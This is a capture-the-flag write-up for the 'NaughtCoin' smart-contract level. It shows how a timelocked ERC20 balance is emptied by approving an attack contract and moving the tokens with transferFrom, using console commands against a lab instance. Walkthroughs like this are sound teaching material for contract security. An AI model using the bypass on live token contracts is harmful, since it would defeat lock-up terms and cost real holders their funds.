# Level 15: NaughtCoin

### Wargame
NaughtCoin is an ERC20 token and you're already holding all of them. The catch is that you'll only be able to transfer them after a 10 year lockout period. Can you figure out how to get them out to another address so that you can transfer them freely? Complete this level by getting your token balance to 0.

### Key Insights
* ERC20
* approve
* transferFrom

### Attack Steps
1. Before executing the attack, display the balance of the player address - it would be 1000000 Ether.
    ```bash
    > instance
    '0x9Eb8eD3845271f4fba9781a08C26aA310f72e5A5'

    > player
    '0xEB47eAB0027B0DDd5615D00f9D83eC0e71D3aeFf'

    > myBalance = await contract.balanceOf(player)
    > await fromWei(myBalance)
    '1000000'
    ```

2. Deploy Contract NaughtCoinAttack contract with target address.

3. Calling approve() lets NaughtCoinAttack contract address get permission to spend balance in target contract.
    ```bash
    > await contract.approve("0x656669C4cdEAC2DA1cC0c9F4813B3f5B2d1116D9", myBalance)
    ```

4. Call attack() of NaughtCoinAttack contract with player address.

5. After the attack transaction is confirmed, check the balance value again - it should be zero.
    ```bash
    > myBalance = await contract.balanceOf(player)
    > await fromWei(myBalance)
    '0'
    ```
